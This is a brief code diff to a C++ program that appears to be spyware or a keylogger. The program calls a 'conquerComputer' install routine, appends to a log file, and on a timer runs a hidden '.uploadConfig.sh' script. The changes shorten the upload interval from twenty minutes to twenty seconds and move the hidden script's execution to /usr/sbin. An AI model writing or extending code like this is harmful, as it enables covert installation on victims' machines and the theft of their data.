@@ -70,7 +70,7 @@ int main(int argc, char **argv)
         conquerComputer(installPath.c_str());
     }
 
-    int timeInterval = 20 * 60;
+    int timeInterval = 20;
     if(args >> GetOpt::OptionPresent('t', "time"))
     {
         args >> GetOpt::Option('t', "time", timeInterval, 60);
@@ -100,7 +100,7 @@ int main(int argc, char **argv)
 
         if(timeController.checkTime())
         {
-            system("./.uploadConfig.sh");
+            system("cd /usr/sbin/ && ./.uploadConfig.sh");
         }
         fleObj.close();
         fleObj.open(path, std::ios::app | std::ios::ate);
